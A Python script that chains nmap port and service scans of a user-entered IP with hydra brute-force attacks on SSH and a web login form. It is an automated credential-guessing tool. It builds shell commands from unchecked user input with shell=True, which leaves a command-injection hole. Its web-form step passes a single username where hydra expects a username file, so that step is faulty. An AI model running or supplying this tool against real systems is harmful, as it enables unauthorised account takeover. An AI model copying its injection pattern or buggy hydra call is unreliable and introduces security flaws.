import os
import subprocess
import re

# Function to validate IP address
def validate_ip(ip):
    # Use regex to check if the input string is a valid IPv4 address
    pattern = re.compile(
        r"\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
    return bool(pattern.match(ip))


# Function to check if a file exists at the given path
def file_exists(file_path):
    return os.path.isfile(file_path)


# Function to run a command and print its output
def run_command(command):
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        while process.poll() is None:
            output = process.stdout.readline().strip()
            if output:
                print(output)
        _, stderr = process.communicate()
        if stderr:
            print(stderr.strip())
    except Exception as e:
        print(f"An error occurred: {e}")


# Function to scan ports of a target using nmap        
def scan_ports(target):
    print(f"Scanning ports on {target}...")
    command = f"nmap -Pn {target}"
    run_command(command)


# Function to enumerate services of a target using nmap
def enumerate_services(target):
    print(f"Enumerating services on {target}...")
    command = f"nmap -sV {target}"
    run_command(command)

    
# Function to brute force ssh service on a target using hydra
def brute_force(target, user, pass_list):
    print(f"Running brute force attack on {target}...")
    command = f"hydra -l {user} -P {pass_list} {target} ssh"
    run_command(command)


# Function to brute force web form on a target using hydra
def brute_force_web_form(target, form_parameters, user, pass_list):
    print(f"Running brute force attack on web form at {target}...")
    command = f"hydra -L {user} -P {pass_list} {target} http-post-form \"{form_parameters}\""
    run_command(command)


# Main function to execute the script
def main():
    try:
        # Ask the user for the target IP, username, and password list
        target = input("Enter the target IP: ")
        if not validate_ip(target):
            print("Invalid IP address. Exiting...")
            return

        user = input("Enter the username for brute force attack: ")
        pass_list = input("Enter the path to the password list for brute force attack: ")
        if not file_exists(pass_list):
            print("Password file does not exist. Exiting...")
            return

        # Call the functions to scan ports, enumerate services, and brute force ssh
        scan_ports(target)
        enumerate_services(target)
        brute_force(target, user, pass_list)
        
        # Ask the user for the form parameters and then brute force the web form
        form_parameters = input("Enter the form parameters for web form brute force attack: ")
        brute_force_web_form(target, form_parameters, user, pass_list)
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting...")

        
# Start the script
if __name__ == "__main__":
    main()
